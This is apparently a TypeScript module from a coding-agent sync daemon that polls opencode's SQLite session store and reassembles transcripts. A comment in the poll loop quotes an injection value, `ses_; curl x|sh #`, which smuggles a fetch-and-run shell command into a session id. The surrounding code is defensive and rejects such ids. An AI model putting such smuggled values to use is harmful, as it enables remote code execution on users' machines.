// OpenCode's transcript store. Current opencode (v1.2.0+; verified on v1.18.3)
// keeps everything in a single SQLite database at ~/.local/share/opencode/opencode.db
// (WAL mode), NOT the legacy storage/ JSON tree older builds used. The relevant
// tables:
//
//   session(id, project_id, directory, title, version, time_created, time_updated, …)
//   message(id, session_id, time_created, time_updated, data)   -- data = message JSON
//   part(id, message_id, session_id, time_created, time_updated, data)  -- data = part JSON
//
// message.data / part.data hold the exact JSON opencode used to write to msg_*.json /
// prt_*.json (minus the id, which is the row's primary key). So this module reads the
// DB and re-assembles a session into the same shape `opencode export <id>` emits —
// { info, messages: [{ info, parts }] } — which parseOpencodeSessionFile consumes.
// The daemon reads read-only; opencode owns the file. Modeled on cursorWatcher.ts
// (bun:sqlite, readonly open, poll + watermark, per-poll open/close, circuit breaker).
import { assembleOpencodeRows, type SessionRow } from "./opencodeTranscriptAssembly.js";
import { EventEmitter } from "events";
import * as fs from "fs";
import * as path from "path";
import {
  type TranscriptDirEvent,
  type TranscriptDirWatcherEvents,
  type DirEventWatcher,
} from "./transcriptDirWatcher.js";
import { getPosition, setPosition } from "./positionTracker.js";
import { OPENCODE_SESSION_ID_RE } from "./resumeCommand.js";
import { AGENT_CLIENTS } from "@codecast/shared/contracts";
import { rebindingStore } from "./cachedJsonStore.js";
import { codecastPath } from "./codecastDir.js";
import { openOpencodeDb, queryOpencodeDelta, type OpencodeDelta } from "./opencodeStorageQuery.js";

export type { OpencodeDelta };
export { queryOpencodeDelta };

// Last-seen store mtime, keyed by the real db path. Survives a daemon restart
// so an unchanged multi-gigabyte file is never opened just to rediscover that
// nothing moved — that open is what pinned the loop for 7-23s on every boot
// today (poll@opencodeStorage.ts, 2026-09-15). Pruned when the db is gone.
const pollMtimes = rebindingStore<number>(() => codecastPath("opencode-poll-mtimes.json"), {
  keepOnLoadAsync: (dbPath) => fs.promises.access(dbPath).then(
    () => true,
    (error: NodeJS.ErrnoException) => error.code !== "ENOENT" && error.code !== "ENOTDIR",
  ),
});

/** Absolute path to opencode's SQLite store, from the registry descriptor. */
export function opencodeDbPath(): string {
  const root = AGENT_CLIENTS.opencode.transcriptRoots[0];
  return root.startsWith("~/") ? path.join(process.env.HOME || "", root.slice(2)) : root;
}

const openDb = openOpencodeDb;


/** True when a session exists in the opencode DB — the existence check
 *  findSessionFile uses to claim a `ses_*` id as opencode's. */
export function sessionExistsInOpencodeDb(sessionId: string, dbPath: string = opencodeDbPath()): boolean {
  const db = openDb(dbPath);
  if (!db) return false;
  try {
    return db.query("SELECT 1 FROM session WHERE id = ? LIMIT 1").get(sessionId) != null;
  } catch {
    return false;
  } finally {
    db.close();
  }
}

/** The cwd an opencode session ran in — used to bind a freshly launched session to
 *  its pending started-tmux conversation (matchStartedConversation's cwd fallback).
 *  The DB's session.directory is the authoritative, NOT-NULL cwd. */
export function resolveOpencodeSessionCwd(sessionId: string, dbPath: string = opencodeDbPath()): string | undefined {
  const db = openDb(dbPath);
  if (!db) return undefined;
  try {
    const row = db.query<{ directory: string | null }, [string]>(
      "SELECT directory FROM session WHERE id = ?",
    ).get(sessionId);
    return row?.directory ?? undefined;
  } catch {
    return undefined;
  } finally {
    db.close();
  }
}

/**
 * Assemble a whole opencode session from the DB into the `opencode export` JSON
 * shape ({ info, messages: [{ info, parts }] }) as a string, or null if the session
 * has no readable messages. This is the read boundary parseTranscriptFor("opencode",
 * …) consumes: the SQL rows are stitched here, the parser stays a pure
 * string→ParsedMessage[] function. The row id (primary key) is injected back into
 * each message/part object, since opencode stores it as the column, not inside `data`.
 */
export function assembleOpencodeSession(sessionId: string, dbPath: string = opencodeDbPath()): string | null {
  const db = openDb(dbPath);
  if (!db) return null;
  try {
    const session = db.query<SessionRow, [string]>(
      "SELECT id, directory, title, version, project_id, slug, time_created, time_updated FROM session WHERE id = ?",
    ).get(sessionId);
    if (!session) return null;

    const messageRows = db.query<{ id: string; data: string }, [string]>(
      "SELECT id, data FROM message WHERE session_id = ? ORDER BY time_created, id",
    ).all(sessionId);
    if (messageRows.length === 0) return null;

    const partRows = db.query<{ message_id: string; id: string; data: string }, [string]>(
      "SELECT message_id, id, data FROM part WHERE session_id = ? ORDER BY message_id, id",
    ).all(sessionId);
    return assembleOpencodeRows(session, messageRows, partRows);
  } catch {
    return null;
  } finally {
    db.close();
  }
}

/** The session's task-tool lineage: `parent_id` names the opencode session that
 *  spawned this one via the task tool (subagent runs), `agent` names the profile
 *  it ran as (e.g. "explore"). Queried separately from assembleOpencodeSession so
 *  an older schema without these columns degrades to "no lineage" instead of
 *  breaking session sync. parent_id is externally writable like id, so it gets
 *  the same shape check the watcher applies before anything downstream sees it. */
export function readOpencodeSessionLineage(
  sessionId: string,
  dbPath: string = opencodeDbPath(),
): { parentSessionId?: string; agentName?: string } {
  const db = openDb(dbPath);
  if (!db) return {};
  try {
    const row = db.query<{ parent_id: string | null; agent: string | null }, [string]>(
      "SELECT parent_id, agent FROM session WHERE id = ?",
    ).get(sessionId);
    const parentSessionId = row?.parent_id ?? undefined;
    return {
      parentSessionId: parentSessionId && OPENCODE_SESSION_ID_RE.test(parentSessionId) ? parentSessionId : undefined,
      agentName: row?.agent ?? undefined,
    };
  } catch {
    return {};
  } finally {
    db.close();
  }
}

/** The session's title straight from the DB row (cheaper than assembling), for the
 *  title-sync path. */
export function readOpencodeSessionTitle(sessionId: string, dbPath: string = opencodeDbPath()): string | undefined {
  const db = openDb(dbPath);
  if (!db) return undefined;
  try {
    const row = db.query<{ title: string | null }, [string]>(
      "SELECT title FROM session WHERE id = ?",
    ).get(sessionId);
    return row?.title ?? undefined;
  } catch {
    return undefined;
  } finally {
    db.close();
  }
}

export declare interface OpencodeStorageWatcher {
  on<K extends keyof TranscriptDirWatcherEvents>(event: K, listener: TranscriptDirWatcherEvents[K]): this;
  emit<K extends keyof TranscriptDirWatcherEvents>(event: K, ...args: Parameters<TranscriptDirWatcherEvents[K]>): boolean;
}

/**
 * Polls the opencode SQLite store and emits one `session` event per session whose
 * message/part/session rows advanced past a `time_updated` watermark — a single
 * global max across the three tables, because session.time_updated alone is
 * insufficient (a message can be written after its session row updates, verified on
 * real rows). Cheap when idle: a stat of the db + -wal file gates the query, so an
 * unchanged store costs only two stats — and that mtime is persisted, so a
 * daemon restart of an unchanged store is also two stats, not a cold open of
 * a multi-gigabyte file. When the store HAS moved, the SQL runs on a worker
 * thread (the mmap under swap pinned the daemon loop for 7-23s; see
 * queryOpencodeDelta). Structurally mirrors cursorWatcher (readonly open,
 * poll interval, per-poll open/close, in-flight skip, error circuit-breaker).
 *
 * The watermark PERSISTS across daemon restarts via positionTracker (getPosition/
 * setPosition, keyed by the db path — a real file, so the store's dead-key prune
 * keeps it). This closes the catch-up gap a silent first-poll prime would leave: a
 * session that runs start-to-finish while the daemon is down advances the DB past
 * the persisted watermark, so the next daemon start emits it and it syncs. The
 * first-EVER run (no persisted watermark → 0) emits every existing session once, a
 * one-time backfill that matches TranscriptDirWatcher/cursorWatcher's first-sight
 * behavior; the persisted watermark then makes every subsequent restart cost only
 * the delta (sessions changed since we last ran) rather than re-emitting the whole
 * DB — the concern the aggregated single-file store would otherwise raise, since
 * re-emitting an already-synced session, while a downstream no-op (addMessages
 * upserts by uuid → indexed read, zero writes), is still O(total history) per
 * restart when every session lives in one DB.
 *
 * `filePath` on the event is set to the session id so the daemon's registration seam
 * debounces per session (its InvalidateSync map keys on filePath); processOpencode-
 * Session reads only event.sessionId and re-assembles the whole session each pass, so
 * a session missed at the exact watermark ms self-heals on its next write.
 */
export class OpencodeStorageWatcher extends EventEmitter implements DirEventWatcher {
  private pollTimer: NodeJS.Timeout | null = null;
  private dbPath: string;
  private pollMs: number;
  private watermark = 0;
  private lastMtime = 0;
  private errorCount = 0;
  private pollInFlight = false;
  private worker: Worker | null = null;
  private workerSeq = 0;
  private readonly injectedQuery?: (dbPath: string, watermark: number) => OpencodeDelta | Promise<OpencodeDelta>;
  private static readonly ERROR_SUPPRESS_THRESHOLD = 3;

  constructor(
    dbPath: string = opencodeDbPath(),
    pollMs = 2000,
    opts?: { queryDelta?: (dbPath: string, watermark: number) => OpencodeDelta | Promise<OpencodeDelta> },
  ) {
    super();
    this.dbPath = dbPath;
    this.pollMs = pollMs;
    this.injectedQuery = opts?.queryDelta;
  }

  start(): void {
    if (this.pollTimer) return;
    // Resume from where the previous daemon left off. 0 on the first-ever run, which
    // makes the first poll emit every existing session (`time_updated > 0`) — the
    // one-time backfill; thereafter this is the last persisted high-water mark.
    this.watermark = getPosition(this.dbPath);
    // Last-seen mtime from a previous run of THIS db. Matching the live mtime
    // means nothing moved while we were down, so the first poll is two stats
    // and does not open the file.
    this.lastMtime = pollMtimes().get(this.dbPath) || 0;
    this.emit("ready");
    this.pollTimer = setInterval(() => { void this.poll(); }, this.pollMs);
    setImmediate(() => { void this.poll(); });
  }

  stop(): void {
    if (this.pollTimer) {
      clearInterval(this.pollTimer);
      this.pollTimer = null;
    }
    this.worker?.terminate();
    this.worker = null;
  }

  /** Max mtime across the db and its -wal sidecar; 0 if the db is absent. WAL writes
   *  land in -wal before a checkpoint, so both must be checked. */
  private storeMtime(): number {
    let m = 0;
    for (const p of [this.dbPath, this.dbPath + "-wal"]) {
      try { m = Math.max(m, fs.statSync(p).mtimeMs); } catch {}
    }
    return m;
  }

  // A poll still running when the next tick fires is skipped, so a slow disk
  // makes polls sparser instead of stacking them on the daemon loop.
  private async poll(): Promise<void> {
    if (this.pollInFlight) return;
    const mtime = this.storeMtime();
    if (mtime === 0) return; // no db yet
    if (this.lastMtime !== 0 && mtime === this.lastMtime) return;
    this.pollInFlight = true;
    this.lastMtime = mtime;
    try {
      const { globalMax, sessionIds } = await this.queryDelta(this.watermark);
      // Absorb any wal touch our own open caused so the next tick does not
      // treat it as a real write and query again.
      this.lastMtime = this.storeMtime() || mtime;
      pollMtimes().set(this.dbPath, this.lastMtime);
      if (globalMax <= this.watermark) return;

      this.watermark = globalMax;
      setPosition(this.dbPath, globalMax); // survive a restart at this high-water mark
      this.errorCount = 0;
      for (const sid of sessionIds) {
        // The `id` column is externally writable — any process can INSERT a session
        // row. A `startsWith("ses_")` check let `ses_; curl x|sh #` through, and that
        // string would become the convex session_id and later an unescaped resume
        // command. Enforce opencode's real id shape (`ses_<base62>`); skip anything
        // else rather than emit it.
        if (typeof sid !== "string") continue;
        if (!OPENCODE_SESSION_ID_RE.test(sid)) {
          console.warn(`[SECURITY] skipping opencode session with a malformed id: ${sid.slice(0, 40)}`);
          continue;
        }
        this.emitSession(sid);
      }
    } catch (err) {
      this.errorCount++;
      if (this.errorCount <= OpencodeStorageWatcher.ERROR_SUPPRESS_THRESHOLD) {
        const suffix = this.errorCount === OpencodeStorageWatcher.ERROR_SUPPRESS_THRESHOLD ? " (suppressing further errors)" : "";
        this.emit("error", new Error(`opencode DB poll failed: ${err instanceof Error ? err.message : String(err)}${suffix}`));
      }
      // Leave lastMtime un-persisted on failure so the next tick retries.
      this.lastMtime = 0;
    } finally {
      this.pollInFlight = false;
    }
  }

  private queryDelta(watermark: number): Promise<OpencodeDelta> {
    if (this.injectedQuery) return Promise.resolve(this.injectedQuery(this.dbPath, watermark));
    return this.queryDeltaInWorker(watermark);
  }

  private queryDeltaInWorker(watermark: number): Promise<OpencodeDelta> {
    const worker = this.ensureWorker();
    const id = ++this.workerSeq;
    return new Promise((resolve, reject) => {
      const onMessage = (event: MessageEvent) => {
        const msg = event.data;
        if (!msg || msg.id !== id) return;
        worker.removeEventListener("message", onMessage);
        worker.removeEventListener("error", onError);
        if (msg.ok) resolve({ globalMax: msg.globalMax, sessionIds: msg.sessionIds });
        else reject(new Error(msg.error || "opencode poll worker failed"));
      };
      const onError = (err: ErrorEvent) => {
        worker.removeEventListener("message", onMessage);
        worker.removeEventListener("error", onError);
        this.worker = null;
        reject(err.error instanceof Error ? err.error : new Error(String(err.message)));
      };
      worker.addEventListener("message", onMessage);
      worker.addEventListener("error", onError);
      worker.postMessage({ id, dbPath: this.dbPath, watermark });
    });
  }

  private ensureWorker(): Worker {
    if (this.worker) return this.worker;
    // The built name: a compiled binary holds the worker only as `.js` (see
    // WORKER_ENTRIES in scripts/build-with-native.ts), and source resolves it too.
    this.worker = new Worker(new URL("./opencodeStorage.worker.js", import.meta.url).href);
    return this.worker;
  }

  private emitSession(sessionId: string): void {
    const event: TranscriptDirEvent = { sessionId, filePath: sessionId, eventType: "change" };
    this.emit("session", event);
  }
}
